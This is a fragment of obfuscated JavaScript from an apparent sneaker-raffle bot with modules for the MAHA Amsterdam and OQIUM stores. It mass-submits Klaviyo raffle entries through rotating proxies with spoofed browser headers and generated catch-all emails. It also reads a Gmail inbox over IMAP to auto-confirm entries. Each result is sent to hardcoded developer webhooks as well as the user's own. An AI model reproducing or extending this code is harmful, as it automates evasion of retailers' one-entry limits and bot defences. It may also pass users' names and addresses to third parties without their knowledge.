                            console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20' + _0x57cfdb)), _0x33696f = '' + _0x57cfdb;
                            var _0x406bd2 = await _0x23dc1b(_0x5a4286[_0x1068e1], _0xcaab4c, 'dev', !![], _0x33696f);
                            _0x1f6648['errorDEV'] = { 'embeds': [_0x406bd2] }, _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x1f6648['errorDEV']), await _0x4236dd(_0x48c50b, _0x1f6648['errorDEV']), _0x587126 = 'yes';
                        } finally {
                            _0x25aa60 && _0x25aa60['close']();
                            if (_0x587126 == 'yes' && _0x2393a4 != 0x5) {
                                console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0xcaab4c['name'] + ']\x20Task\x20' + (_0x1068e1 + 0x1) + '\x20:\x20Retrying')), _0x1068e1 = _0x1068e1 - 0x1, _0x2393a4 = _0x2393a4 + 0x1;
                                continue;
                            }
                            _0x587126 == 'yes' && _0x2393a4 >= 0x5 && (_0xc8d9fd(_0x5a4286[_0x1068e1], _0xcaab4c), _0x587126 = 'no', _0x2393a4 = 0x0), console['log']('Waiting\x20for\x20' + _0x9a51aa['AfewDelay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['AfewDelay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'MAHA\x20Amsterdam',
        'modules': [
            {
                'name': 'MAHA\x20Raffle\x20Entries',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=THxSew',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RvxrAV',
                            'custom_source': 'Air\x20Jordan\x201\x20High\x20OG\x20\x27White\x20Cement\x27',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'WQN5XR',
                                '$consent_form_version': 0x7f7254,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x11a1f0, _0x14c377, _0x5597ea) {
                    for (var _0x2b7384 = 0x0; _0x2b7384 < _0x14c377['length']; _0x2b7384++) {
                        async function _0x20c131(_0x2001f3, _0xdf77f6, _0x36da7b, _0x33864d, _0x5c0a23) {
                            var _0xe0364f, _0x33a69d = {}, _0x1c62a0 = [], _0x12aa91 = {}, _0x3a3430 = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x1e813b = Math['round'](Math['random']() * (_0x3a3430['length'] - 0x1));
                            _0x33864d[_0x2001f3]['Size'] == 'RANDOM' && (_0x33864d[_0x2001f3]['Size'] = _0x3a3430[_0x1e813b]);
                            !_0x33864d && (_0x33864d = {});
                            if (_0xdf77f6 != 'ver') {
                                _0x1f02d2(_0x36da7b['name'] + '\x20Task\x20' + (_0x2001f3 + 0x1) + '\x20/\x20' + _0x33864d['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa), await _0x2f5330(_0x33864d, _0x2001f3), _0x33a69d = _0x36da7b['data'];
                                _0xdf77f6 == 'exp' ? _0x33a69d['data']['attributes']['email'] = '' + _0x33864d[_0x2001f3]['FirstName'] + _0x33864d[_0x2001f3]['LastName'] + _0x9a51aa['catchall'] : _0x33a69d['data']['attributes']['email'] = '' + _0x33864d[_0x2001f3]['Email'];
                                if (_0x33864d[_0x2001f3]['Size'] == 'RANDOM') {
                                }
                                _0x33a69d['data']['attributes']['properties']['$first_name'] = '' + _0x33864d[_0x2001f3]['FirstName'], _0x33a69d['data']['attributes']['properties']['$last_name'] = '' + _0x33864d[_0x2001f3]['LastName'], _0x33a69d['data']['attributes']['properties']['$address1'] = _0x33864d[_0x2001f3]['Address1'] + '\x20' + _0x33864d[_0x2001f3]['Address2'] + '\x20' + _0x33864d[_0x2001f3]['HouseNumber'], _0x33a69d['data']['attributes']['properties']['$zip'] = '' + _0x33864d[_0x2001f3]['Zip'], _0x33a69d['data']['attributes']['properties']['$city'] = '' + _0x33864d[_0x2001f3]['City'], _0x33a69d['data']['attributes']['properties']['$country'] = '' + _0x33864d[_0x2001f3]['Country'], _0x33a69d['data']['attributes']['properties']['Size'] = '' + _0x33864d[_0x2001f3]['Size'], _0x33a69d['data']['attributes']['properties']['$phone_number'] = '' + _0x33864d[_0x2001f3]['Phone'], _0x33a69d['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x33864d[_0x2001f3]['Follower'];
                            }
                            if (_0x9a51aa['useRandomProxy'] = ![])
                                var _0x216d3b = _0x5c0a23[_0x2001f3]['split'](':');
                            else
                                var _0x2a39ab = Math['round'](Math['random']() * (_0x5c0a23['length'] - 0x1)), _0x216d3b = _0x5c0a23[_0x2a39ab]['split'](':');
                            var _0x49b6a7 = {
                                'jar': _0x3720c0,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x36da7b['url'],
                                'headers': _0x36da7b['headers'],
                                'body': JSON['stringify'](_0x33a69d),
                                'proxy': 'http://' + _0x216d3b[0x2] + ':' + _0x216d3b[0x3] + '@' + _0x216d3b[0x0] + ':' + _0x216d3b[0x1]
                            };
                            return _0xdf77f6 != 'ver' && (_0x49b6a7['url'] = _0x36da7b['url'], _0x49b6a7['headers'] = _0x36da7b['headers']), _0xdf77f6 == 'ver' && (_0x49b6a7['method'] = 'GET'), new Promise(function (_0xb9ff76, _0x55e192) {
                                callback = async (_0x13cd72, _0xf6326d, _0x544ced) => {
                                    if (!_0x13cd72 && _0xf6326d['statusCode'] == 0xca || !_0x13cd72 && _0xf6326d['statusCode'] == 0xc8) {
                                        if (_0xdf77f6 != 'ver') {
                                            var _0x27c2a0 = await _0x23dc1b(_0x33864d[_0x2001f3], _0x36da7b, 'dev', ![]), _0xb5d2fc = await _0x23dc1b(_0x33864d[_0x2001f3], _0x36da7b, 'pub', ![]);
                                            const _0x18dbdc = {
                                                'succesDEVMSG': { 'embeds': [_0x27c2a0] },
                                                'succesPUBMSG': { 'embeds': [_0xb5d2fc] }
                                            };
                                            if (_0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '')
                                                try {
                                                    await _0x4236dd(_0x9a51aa['webhook'], _0x18dbdc['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x18dbdc['succesDEVMSG']), await _0xbbd9dc(0xc8);
                                            try {
                                                await _0x4236dd(_0x4d6262, _0x18dbdc['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x5d1d0f(_0x33864d[_0x2001f3], _0x36da7b);
                                        }
                                        _0xb9ff76(console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x36da7b['name'] + ']\x20Task\x20' + (_0x2001f3 + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0xdf77f6 != 'ver') {
                                            var _0x52c31a = '' + _0x13cd72, _0x57d244 = await _0x23dc1b(_0x33864d[_0x2001f3], _0x36da7b, 'dev', !![], _0x52c31a), _0x351c22 = {};
                                            _0x351c22['errorDEV'] = { 'embeds': [_0x57d244] }, _0xc8d9fd(_0x33864d[_0x2001f3], _0x36da7b), _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x351c22['errorDEV']), await _0x4236dd(_0x48c50b, _0x351c22['errorDEV']);
                                        }
                                        _0x55e192(console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x36da7b['name'] + ']\x20Task\x20' + (_0x2001f3 + 0x1) + ':\x20' + _0x13cd72)));
                                    }
                                };
                                try {
                                    _0xdf77f6 != 'ver' && console['log'](_0x38a61b() + '\x20[' + _0x36da7b['name'] + ']\x20Task\x20' + (_0x2001f3 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x33a69d['data']['attributes']['email']), _0x355e6b(_0x49b6a7, callback);
                                } catch (_0x4c0eb1) {
                                    console['log'](_0x38a61b() + '\x20Task\x20' + (_0x2001f3 + 0x1) + ':\x20' + _0x4c0eb1);
                                }
                            });
                        }
                        ;
                        try {
                            await _0x20c131(_0x2b7384, 'nor', _0x11a1f0, _0x14c377, _0x5597ea), console['log'](_0x38a61b() + '\x20[' + _0x11a1f0['name'] + ']\x20Sleeping\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        } catch (_0x5b27c6) {
                        }
                    }
                }
            },
            {
                'name': 'MAHA\x20Raffle\x20Verification',
                'store': 'MAHA',
                'logo': 'https://i1.sndcdn.com/avatars-XIAMNs5LPWV2iRwj-SNwa5A-t500x500.jpg',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x59bcc8, _0x2a8be1, _0xe127a8) {
                    var _0x776c2c = [];
                    async function _0x26a583() {
                        var _0x20f87a = new _0x9597be({
                            'user': _0x9a51aa['masterMail'],
                            'password': _0x9a51aa['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x126f19(_0x4f71b3) {
                            _0x20f87a['openBox']('INBOX', ![], _0x4f71b3);
                        }
                        _0x20f87a['once']('ready', function () {
                            _0x126f19(function (_0x1a7fe5, _0x24d77e) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x1a7fe5)
                                    throw _0x1a7fe5;
                                _0x20f87a['seq']['search'](['UNSEEN'], function (_0x4cb467, _0x283222) {
                                    if (!_0x283222 || !_0x283222['length'])
                                        console['log'](_0x38a61b() + '\x20[' + _0x59bcc8['name'] + ']\x20No\x20mails\x20found'), _0x20f87a['end']();
                                    else {
                                        var _0x220a21 = _0x20f87a['seq']['fetch'](_0x283222, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x220a21['on']('message', function (_0x1f831c, _0x3c053c) {
                                            var _0x184d9e = '(#' + _0x3c053c + ')\x20';
                                            _0x1f831c['on']('body', function (_0x45c51b, _0x78fd48) {
                                                _0x45ab86(_0x45c51b, (_0x91c19c, _0x538271) => {
                                                    if (_0x538271['subject'] == 'Confirm\x20Your\x20Subscription' && _0x538271['from']['value'][0x0]['name'] == 'Maha\x20Amsterdam') {
                                                        var _0x5cd72d = _0x538271['text']['split']('(')[0x1], _0x59068f = _0x5cd72d['split'](')')[0x0];
                                                        _0x776c2c['push'](_0x59068f);
                                                    }
                                                });
                                            }), _0x1f831c['once']('end', function () {
                                            });
                                        }), _0x220a21['once']('error', function (_0x36f315) {
                                            console['log']('Fetch\x20error:\x20' + _0x36f315);
                                        }), _0x220a21['once']('end', function () {
                                            _0x20f87a['end']();
                                        });
                                    }
                                });
                            });
                        }), _0x20f87a['once']('error', function (_0x2650dd) {
                            console['log'](_0x19e6c5['red'](_0x2650dd['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox');
                        }), _0x20f87a['once']('end', async function () {
                        }), _0x20f87a['connect']();
                    }
                    async function _0xa58537(_0x4339af, _0x1f275b, _0x51810f) {
                        for (var _0x527cdb = 0x0; _0x527cdb < _0x1f275b['length']; _0x527cdb++) {
                            async function _0x27b8c2(_0x33447a, _0x505bdf, _0x507668, _0x426883, _0x203ac8) {
                                var _0x198d3e, _0x378ae7 = {}, _0x527279 = [], _0x494c7f = {}, _0x45c326 = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x3c0d20 = Math['round'](Math['random']() * (_0x45c326['length'] - 0x1));
                                _0x426883[_0x33447a]['Size'] == 'RANDOM' && (_0x426883[_0x33447a]['Size'] = _0x45c326[_0x3c0d20]);
                                !_0x426883 && (_0x426883 = {});
                                if (_0x9a51aa['useRandomProxy'] = ![])
                                    var _0x22da65 = _0x203ac8[_0x33447a]['split'](':');
                                else
                                    var _0x2938d0 = Math['round'](Math['random']() * (_0x203ac8['length'] - 0x1)), _0x22da65 = _0x203ac8[_0x2938d0]['split'](':');
                                var _0x15f802 = {
                                    'jar': _0x3720c0,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x507668['url'],
                                    'headers': _0x507668['headers'],
                                    'body': JSON['stringify'](_0x378ae7),
                                    'proxy': 'http://' + _0x22da65[0x2] + ':' + _0x22da65[0x3] + '@' + _0x22da65[0x0] + ':' + _0x22da65[0x1]
                                };
                                return _0x505bdf != 'ver' && (_0x15f802['url'] = _0x507668['url'], _0x15f802['headers'] = _0x507668['headers']), _0x505bdf == 'ver' && (_0x15f802['method'] = 'GET', _0x15f802['url'] = _0x426883[_0x33447a]), new Promise(function (_0x2cf77a, _0x3322e7) {
                                    callback = async (_0x5992f0, _0x2bf52f, _0x4e868f) => {
                                        if (!_0x5992f0 && _0x2bf52f['statusCode'] == 0xca || !_0x5992f0 && _0x2bf52f['statusCode'] == 0xc8) {
                                            if (_0x505bdf != 'ver') {
                                                var _0x5dc8ed = await _0x23dc1b(_0x426883[_0x33447a], _0x507668, 'dev', ![]), _0x20536f = await _0x23dc1b(_0x426883[_0x33447a], _0x507668, 'pub', ![]);
                                                const _0x1b2a63 = {
                                                    'succesDEVMSG': { 'embeds': [_0x5dc8ed] },
                                                    'succesPUBMSG': { 'embeds': [_0x20536f] }
                                                };
                                                if (_0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '')
                                                    try {
                                                        await _0x4236dd(_0x9a51aa['webhook'], _0x1b2a63['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x1b2a63['succesDEVMSG']), await _0xbbd9dc(0xc8);
                                                try {
                                                    await _0x4236dd(_0x4d6262, _0x1b2a63['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x5d1d0f(_0x426883[_0x33447a], _0x507668);
                                            }
                                            _0x2cf77a(console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x507668['name'] + ']\x20Task\x20' + (_0x33447a + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x505bdf != 'ver') {
                                                var _0x1bef55 = '' + _0x5992f0, _0x403eff = await _0x23dc1b(_0x426883[_0x33447a], _0x507668, 'dev', !![], _0x1bef55), _0xf0d4ed = {};
                                                _0xf0d4ed['errorDEV'] = { 'embeds': [_0x403eff] }, _0xc8d9fd(_0x426883[_0x33447a], _0x507668), _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0xf0d4ed['errorDEV']), await _0x4236dd(_0x48c50b, _0xf0d4ed['errorDEV']);
                                            }
                                            _0x3322e7(console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x507668['name'] + ']\x20Task\x20' + (_0x33447a + 0x1) + ':\x20' + _0x5992f0)));
                                        }
                                    };
                                    try {
                                        _0x505bdf != 'ver' ? console['log'](_0x38a61b() + '\x20[' + _0x507668['name'] + ']\x20Task\x20' + (_0x33447a + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x378ae7['data']['attributes']['email']) : console['log'](_0x38a61b() + '\x20[' + _0x507668['name'] + ']\x20Task\x20' + (_0x33447a + 0x1) + ':\x20Fetching\x20Response'), _0x355e6b(_0x15f802, callback);
                                    } catch (_0x4ecb02) {
                                        console['log'](_0x38a61b() + '\x20Task\x20' + (_0x33447a + 0x1) + ':\x20' + _0x4ecb02);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x27b8c2(_0x527cdb, 'ver', _0x4339af, _0x1f275b, _0x51810f), console['log'](_0x38a61b() + '\x20[' + _0x4339af['name'] + ']\x20Sleeping\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                            } catch (_0x47108d) {
                            }
                        }
                    }
                    try {
                        _0x26a583(), await _0xbbd9dc(0xfa0), console['log']('Found\x20' + _0x776c2c['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0xbbd9dc(0x9c4);
                    }
                    await _0xa58537(_0x59bcc8, _0x776c2c, _0xe127a8);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'RsxJgQ',
                            'custom_source': 'DV6989-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'TiDS2V',
                                '$consent_form_version': 0x80926b,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0xf747cf, _0x511865, _0x3a1c6b) {
                    for (var _0x57e5a6 = 0x0; _0x57e5a6 < _0x511865['length']; _0x57e5a6++) {
                        async function _0xefe6f3(_0x3bafec, _0x540b6f, _0x4d3d95, _0x1aebb0, _0x318e99) {
                            var _0x1dd755, _0x50b060 = {}, _0x1a2360 = [], _0x5b692f = {}, _0x588fbd = [
                                '40',
                                '40,5',
                                '41',
                                '42',
                                '42,5',
                                '43',
                                '44',
                                '45',
                                '45,5',
                                '46',
                                '47',
                                '47,5',
                                '48'
                            ], _0x4b564c = Math['round'](Math['random']() * (_0x588fbd['length'] - 0x1));
                            _0x1aebb0[_0x3bafec]['Size'] == 'RANDOM' && (_0x1aebb0[_0x3bafec]['Size'] = _0x588fbd[_0x4b564c]);
                            !_0x1aebb0 && (_0x1aebb0 = {});
                            if (_0x540b6f != 'ver') {
                                _0x1f02d2(_0x4d3d95['name'] + '\x20Task\x20' + (_0x3bafec + 0x1) + '\x20/\x20' + _0x1aebb0['length'] + '\x20||\x20File:\x20' + _0x52146d + '\x20Proxies:\x20' + _0x5291fa), await _0x2f5330(_0x1aebb0, _0x3bafec), _0x1a2360 = [{
                                    'type': 'rich',
                                    'title': 'Succesful\x20OQIUM\x20Entry',
                                    'description': '',
                                    'color': 0xc0d6d6,
                                    'fields': [
                                        {
                                            'name': 'User',
                                            'value': '' + _0x213f4d
                                        },
                                        {
                                            'name': 'Size',
                                            'value': '' + _0x1aebb0[_0x3bafec]['Size']
                                        },
                                        {
                                            'name': 'Delay',
                                            'value': '' + _0x9a51aa['delay']
                                        },
                                        {
                                            'name': 'Version',
                                            'value': '' + _0x198625
                                        }
                                    ]
                                }], _0x5b692f = { 'embeds': _0x1a2360 }, _0x50b060 = _0x4d3d95['data'];
                                _0x540b6f == 'exp' ? _0x50b060['data']['attributes']['email'] = '' + _0x1aebb0[_0x3bafec]['FirstName'] + _0x1aebb0[_0x3bafec]['LastName'] + _0x9a51aa['catchall'] : _0x50b060['data']['attributes']['email'] = '' + _0x1aebb0[_0x3bafec]['Email'];
                                if (_0x1aebb0[_0x3bafec]['Size'] == 'RANDOM') {
                                }
                                _0x50b060['data']['attributes']['properties']['$first_name'] = '' + _0x1aebb0[_0x3bafec]['FirstName'], _0x50b060['data']['attributes']['properties']['$last_name'] = '' + _0x1aebb0[_0x3bafec]['LastName'], _0x50b060['data']['attributes']['properties']['$address1'] = _0x1aebb0[_0x3bafec]['Address1'] + '\x20' + _0x1aebb0[_0x3bafec]['Address2'] + '\x20' + _0x1aebb0[_0x3bafec]['HouseNumber'], _0x50b060['data']['attributes']['properties']['$zip'] = '' + _0x1aebb0[_0x3bafec]['Zip'], _0x50b060['data']['attributes']['properties']['$city'] = '' + _0x1aebb0[_0x3bafec]['City'], _0x50b060['data']['attributes']['properties']['$country'] = '' + _0x1aebb0[_0x3bafec]['Country'], _0x50b060['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x1aebb0[_0x3bafec]['Size'], _0x50b060['data']['attributes']['properties']['$phone_number'] = '' + _0x1aebb0[_0x3bafec]['Phone'], _0x50b060['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x1aebb0[_0x3bafec]['Follower'];
                            }
                            if (_0x9a51aa['useRandomProxy'] = ![])
                                var _0x147fd2 = _0x318e99[_0x3bafec]['split'](':');
                            else
                                var _0x40a2d5 = Math['round'](Math['random']() * (_0x318e99['length'] - 0x1)), _0x147fd2 = _0x318e99[_0x40a2d5]['split'](':');
                            var _0x514903 = {
                                'jar': _0x3720c0,
                                'followAllRedirects': !![],
                                'method': 'POST',
                                'url': _0x4d3d95['url'],
                                'headers': _0x4d3d95['headers'],
                                'body': JSON['stringify'](_0x50b060),
                                'proxy': 'http://' + _0x147fd2[0x2] + ':' + _0x147fd2[0x3] + '@' + _0x147fd2[0x0] + ':' + _0x147fd2[0x1]
                            };
                            return _0x540b6f != 'ver' && (_0x514903['url'] = _0x4d3d95['url'], _0x514903['headers'] = _0x4d3d95['headers']), _0x540b6f == 'ver' && (_0x514903['method'] = 'GET'), new Promise(function (_0x173aa4, _0x3f975a) {
                                callback = async (_0x35a130, _0x2c2837, _0x45d3d4) => {
                                    if (!_0x35a130 && _0x2c2837['statusCode'] == 0xca || !_0x35a130 && _0x2c2837['statusCode'] == 0xc8) {
                                        if (_0x540b6f != 'ver') {
                                            var _0x5cc6a3 = await _0x23dc1b(_0x1aebb0[_0x3bafec], _0x4d3d95, 'dev', ![]), _0x2305a4 = await _0x23dc1b(_0x1aebb0[_0x3bafec], _0x4d3d95, 'pub', ![]);
                                            const _0x16da16 = {
                                                'succesDEVMSG': { 'embeds': [_0x5cc6a3] },
                                                'succesPUBMSG': { 'embeds': [_0x2305a4] }
                                            };
                                            if (_0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '')
                                                try {
                                                    await _0x4236dd(_0x9a51aa['webhook'], _0x16da16['succesDEVMSG']);
                                                } catch {
                                                }
                                            await _0xbbd9dc(0xc8), await _0x4236dd(_0x5df4ad, _0x16da16['succesDEVMSG']), await _0xbbd9dc(0xc8);
                                            try {
                                                await _0x4236dd(_0x4d6262, _0x16da16['succesPUBMSG']);
                                            } catch {
                                            }
                                            _0x5d1d0f(_0x1aebb0[_0x3bafec], _0x4d3d95);
                                        }
                                        _0x173aa4(console['log'](_0x19e6c5['green'](_0x38a61b() + '\x20[' + _0x4d3d95['name'] + ']\x20Task\x20' + (_0x3bafec + 0x1) + ':\x20Raffle\x20Entered!')));
                                    } else {
                                        if (_0x540b6f != 'ver') {
                                            var _0x3cb9a7 = '' + _0x35a130, _0x464bc6 = await _0x23dc1b(_0x1aebb0[_0x3bafec], _0x4d3d95, 'dev', !![], _0x3cb9a7), _0x546dec = {};
                                            _0x546dec['errorDEV'] = { 'embeds': [_0x464bc6] }, _0xc8d9fd(_0x1aebb0[_0x3bafec], _0x4d3d95), _0x9a51aa['webhook'] != undefined && _0x9a51aa['webhook'] != '' && await _0x4236dd(_0x9a51aa['webhook'], _0x546dec['errorDEV']), await _0x4236dd(_0x48c50b, _0x546dec['errorDEV']);
                                        }
                                        _0x3f975a(console['log'](_0x19e6c5['red'](_0x38a61b() + '\x20[' + _0x4d3d95['name'] + ']\x20Task\x20' + (_0x3bafec + 0x1) + ':\x20' + _0x35a130)));
                                    }
                                };
                                try {
                                    _0x540b6f != 'ver' && console['log'](_0x38a61b() + '\x20[' + _0x4d3d95['name'] + ']\x20Task\x20' + (_0x3bafec + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x50b060['data']['attributes']['email']), _0x355e6b(_0x514903, callback);
                                } catch (_0x4bdb7c) {
                                    console['log'](_0x38a61b() + '\x20Task\x20' + (_0x3bafec + 0x1) + ':\x20' + _0x4bdb7c);
                                }
                            });
                        }
                        ;
                        try {
                            await _0xefe6f3(_0x57e5a6, 'nor', _0xf747cf, _0x511865, _0x3a1c6b), console['log'](_0x38a61b() + '\x20[' + _0xf747cf['name'] + ']\x20Sleeping\x20for\x20' + _0x9a51aa['delay'] + '\x20ms'), await _0xbbd9dc(_0x9a51aa['delay']);
                        } catch (_0x53423b) {
                        }
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
